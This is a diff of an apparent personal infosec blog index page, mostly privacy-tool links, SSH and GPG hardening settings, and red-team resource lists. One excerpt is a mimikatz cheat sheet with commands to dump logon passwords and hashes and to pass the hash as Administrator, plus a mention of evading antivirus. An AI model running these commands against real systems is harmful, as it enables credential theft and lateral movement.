@@ -15,11 +15,11 @@
   <meta name="twitter:card" content="summary" />
   <meta property="og:url" content="https://blackvolga.github.io/intel/" />
   <meta property="og:type" content="website" />
-  <meta property="og:site_name" content="BLACKVOLGA" />
+  <meta property="og:site_name" content="BLVCKƔXLGV" />
 
   <meta name="generator" content="Hugo 0.49" />
   <link rel="canonical" href="https://blackvolga.github.io/intel/" />
-  <link rel="alternate" href="https://blackvolga.github.io/intel/index.xml" type="application/rss+xml" title="BLACKVOLGA">
+  <link rel="alternate" href="https://blackvolga.github.io/intel/index.xml" type="application/rss+xml" title="BLVCKƔXLGV">
 
   
   
@@ -56,10 +56,6 @@
                 
                   <a href="/post/wsl">wsl</a>
                 
-                  <a href="/post/002">#002</a>
-                
-                  <a href="/post/003">#003</a>
-                
               </div>
             </li>
           
@@ -83,7 +79,7 @@
         
           
             <li>
-              <a title="links" href="/intel/links">links</a>
+              <a title="ref" href="/intel/links">ref</a>
             </li>
           
         
@@ -97,8 +93,8 @@
     
       <div class="avatar-container">
         <div class="avatar-img-border">
-          <a title="BLACKVOLGA" href="https://blackvolga.github.io">
-            <img class="avatar-img" src="https://blackvolga.github.io/img/avatar-icon.png" alt="BLACKVOLGA" />
+          <a title="BLVCKƔXLGV" href="https://blackvolga.github.io">
+            <img class="avatar-img" src="https://blackvolga.github.io/img/avatar-icon.png" alt="BLVCKƔXLGV" />
           </a>
         </div>
       </div>
@@ -224,20 +220,18 @@
               </p>
               <div class="post-entry">
                 
-                  #OS Antergos OR TAILS
-Start with the basics: https://ssd.eff.org/en Advanced Mode: https://www.qubes-os.org/
-##Arch First Steps
-https://github.com/Jguer/yay
+                  OS Antergos OR TAILS
+Start with the basics: https://ssd.eff.org/en
+Advanced Mode: https://www.qubes-os.org/
+Arch First Steps https://github.com/Jguer/yay
 https://github.com/sorin-ionescu/prezto
 https://wiki.archlinux.org/index.php/security
 For everything else, see the oracle: wiki.archlinux.org
-##SSH
-EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
+SSH EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
 ssh-keygen -t ed25519 -a 100 OR ssh-keygen -t rsa -b 4096 -o -a 100
 Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
-##GPG
-~/.gnupg/gpg.conf:
-# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 ###Create Master Key gpg2 --expert --full-gen-key OPTION 8 &gt; s &gt; e &gt; q 4096 &gt; 1y &gt; y
+GPG ~/.gnupg/gpg.conf:
+# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 Create Master Key gpg2 --expert --full-gen-key
                   <a href="https://blackvolga.github.io/intel/101/" class="post-read-more">[Read More]</a>
                 
               </div>
@@ -282,7 +276,8 @@ Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
                 
                   https://github.com/gentilkiwi/mimikatz
 https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
-TLDR: 1.\mimikatz &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit
+TLDR:
+1.\mimikatz &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit
 extract passwds
 1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
 1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
@@ -329,7 +324,7 @@ extract passwds
               </p>
               <div class="post-entry">
                 
-                  <p><a href="https://github.com/jbutewicz/Programming-Mobile-Applications-for-Android-Handheld-Systems">https://github.com/jbutewicz/Programming-Mobile-Applications-for-Android-Handheld-Systems</a></p>
+                  <p><a href="https://github.com/jbutewicz/Programming-Mobile-Applications-for-Android-Handheld-Systems" target="_blank">https://github.com/jbutewicz/Programming-Mobile-Applications-for-Android-Handheld-Systems</a></p>
 
                 
               </div>
@@ -393,7 +388,7 @@ extract passwds
   
   
   &nbsp;|&nbsp;
-  <i class="fa fa-clock-o"></i> 1 minutes (7 words)
+  <i class="fa fa-clock-o"></i> 1 minutes (11 words)
   
   
 </span>
@@ -402,13 +397,15 @@ extract passwds
               </p>
               <div class="post-entry">
                 
-                  <p>Email <a href="https://protonmail.com/">https://protonmail.com/</a></p>
+                  <p>Self Defense <a href="https://ssd.eff.org" target="_blank">https://ssd.eff.org</a></p>
 
-<p>Chat <a href="https://crypto.cat/">https://crypto.cat/</a></p>
+<p>Notepad <a href="http://etherpad.org/" target="_blank">http://etherpad.org/</a></p>
 
-<p>Notepad <a href="http://etherpad.org/">http://etherpad.org/</a></p>
+<p>Email <a href="https://protonmail.com/" target="_blank">https://protonmail.com/</a></p>
 
-<p><a href="https://github.com/hbin/top-programming-fonts/blob/master/Menlo-Regular.ttf">https://github.com/hbin/top-programming-fonts/blob/master/Menlo-Regular.ttf</a></p>
+<p>Chat <a href="https://crypto.cat/" target="_blank">https://crypto.cat/</a></p>
+
+<p>Mobile <a href="https://signal.org/" target="_blank">https://signal.org/</a></p>
 
                 
               </div>
@@ -445,21 +442,21 @@ extract passwds
               </p>
               <div class="post-entry">
                 
-                  <p><a href="https://github.com/enaqx/awesome-pentest">https://github.com/enaqx/awesome-pentest</a>
-<a href="https://github.com/sbilly/awesome-security">https://github.com/sbilly/awesome-security</a>
-<a href="https://github.com/meirwah/awesome-incident-response">https://github.com/meirwah/awesome-incident-response</a>
-<a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets">https://github.com/coreb1t/awesome-pentest-cheat-sheets</a>
-<a href="https://github.com/carpedm20/awesome-hacking">https://github.com/carpedm20/awesome-hacking</a>
-<a href="https://github.com/vitalysim/Awesome-Hacking-Resources">https://github.com/vitalysim/Awesome-Hacking-Resources</a>
-<a href="https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges">https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges</a>
-<a href="https://web.archive.org/web/20161227061020/http://www.zapyaapkforpc.com/2016/12/top-hacking-sites-ctfs-and-wargames-to.html">https://web.archive.org/web/20161227061020/http://www.zapyaapkforpc.com/2016/12/top-hacking-sites-ctfs-and-wargames-to.html</a>
-<a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a>
-<a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a>
-<a href="https://wiki.sans.blue/#!index.md">https://wiki.sans.blue/#!index.md</a>
-<a href="https://www.cybrary.it/">https://www.cybrary.it/</a>
-<a href="https://mkto.cisco.com/security-scholarship">https://mkto.cisco.com/security-scholarship</a>
-<a href="https://nostarch.com/nsm">https://nostarch.com/nsm</a>
-<a href="https://nostarch.com/packetanalysis3">https://nostarch.com/packetanalysis3</a></p>
+                  <p><a href="https://github.com/enaqx/awesome-pentest" target="_blank">https://github.com/enaqx/awesome-pentest</a><br />
+<a href="https://github.com/sbilly/awesome-security" target="_blank">https://github.com/sbilly/awesome-security</a><br />
+<a href="https://github.com/meirwah/awesome-incident-response" target="_blank">https://github.com/meirwah/awesome-incident-response</a><br />
+<a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets" target="_blank">https://github.com/coreb1t/awesome-pentest-cheat-sheets</a><br />
+<a href="https://github.com/carpedm20/awesome-hacking" target="_blank">https://github.com/carpedm20/awesome-hacking</a><br />
+<a href="https://github.com/vitalysim/Awesome-Hacking-Resources" target="_blank">https://github.com/vitalysim/Awesome-Hacking-Resources</a><br />
+<a href="https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges" target="_blank">https://github.com/AnarchoTechNYC/meta/wiki/InfoSec#hacking-challenges</a><br />
+<a href="https://web.archive.org/web/20161227061020/http://www.zapyaapkforpc.com/2016/12/top-hacking-sites-ctfs-and-wargames-to.html" target="_blank">https://web.archive.org/web/20161227061020/http://www.zapyaapkforpc.com/2016/12/top-hacking-sites-ctfs-and-wargames-to.html</a><br />
+<a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming" target="_blank">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a><br />
+<a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki" target="_blank">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a><br />
+<a href="https://wiki.sans.blue/#!index.md" target="_blank">https://wiki.sans.blue/#!index.md</a><br />
+<a href="https://www.cybrary.it/" target="_blank">https://www.cybrary.it/</a><br />
+<a href="https://mkto.cisco.com/security-scholarship" target="_blank">https://mkto.cisco.com/security-scholarship</a><br />
+<a href="https://nostarch.com/nsm" target="_blank">https://nostarch.com/nsm</a><br />
+<a href="https://nostarch.com/packetanalysis3" target="_blank">https://nostarch.com/packetanalysis3</a></p>
 
                 
               </div>
@@ -496,15 +493,15 @@ extract passwds
               </p>
               <div class="post-entry">
                 
-                  <p>ASCII/ANSI ART
-<a href="https://github.com/nrlquaker/nfov">https://github.com/nrlquaker/nfov</a></p>
+                  <p>ASCII/ANSI ART<br />
+<a href="https://github.com/nrlquaker/nfov" target="_blank">https://github.com/nrlquaker/nfov</a></p>
 
-<p>Fonts
-<a href="https://github.com/rewtnull/amigafonts">https://github.com/rewtnull/amigafonts</a>
-<a href="https://github.com/ansilove/BlockZone">https://github.com/ansilove/BlockZone</a></p>
+<p>Fonts<br />
+<a href="https://github.com/rewtnull/amigafonts" target="_blank">https://github.com/rewtnull/amigafonts</a><br />
+<a href="https://github.com/ansilove/BlockZone" target="_blank">https://github.com/ansilove/BlockZone</a></p>
 
-<p>Misc
-3d scanning - <a href="https://github.com/alicevision/meshroom">https://github.com/alicevision/meshroom</a></p>
+<p>Misc<br />
+3d scanning - <a href="https://github.com/alicevision/meshroom" target="_blank">https://github.com/alicevision/meshroom</a></p>
 
                 
               </div>
@@ -541,18 +538,18 @@ extract passwds
               </p>
               <div class="post-entry">
                 
-                  <p>Living Off The Land: <a href="https://github.com/LOLBAS-Project/LOLBAS">https://github.com/LOLBAS-Project/LOLBAS</a></p>
+                  <p>Living Off The Land: <a href="https://github.com/LOLBAS-Project/LOLBAS" target="_blank">https://github.com/LOLBAS-Project/LOLBAS</a></p>
 
-<p>Recon
-<a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a>
-<a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a>
-<a href="https://github.com/thewhiteh4t/pwnedOrNot">https://github.com/thewhiteh4t/pwnedOrNot</a></p>
+<p>Recon<br />
+<a href="https://github.com/jordanpotti/AWSBucketDump" target="_blank">https://github.com/jordanpotti/AWSBucketDump</a><br />
+<a href="https://github.com/laramies/theHarvester" target="_blank">https://github.com/laramies/theHarvester</a><br />
+<a href="https://github.com/thewhiteh4t/pwnedOrNot" target="_blank">https://github.com/thewhiteh4t/pwnedOrNot</a></p>
 
-<p>DNS
-<a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a>
-<a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a></p>
+<p>DNS<br />
+<a href="https://github.com/darkoperator/dnsrecon" target="_blank">https://github.com/darkoperator/dnsrecon</a><br />
+<a href="https://github.com/michenriksen/aquatone" target="_blank">https://github.com/michenriksen/aquatone</a></p>
 
-<p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p>
+<p><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" target="_blank">https://github.com/infosecn1nja/Red-Teaming-Toolkit</a></p>
 
                 
               </div>
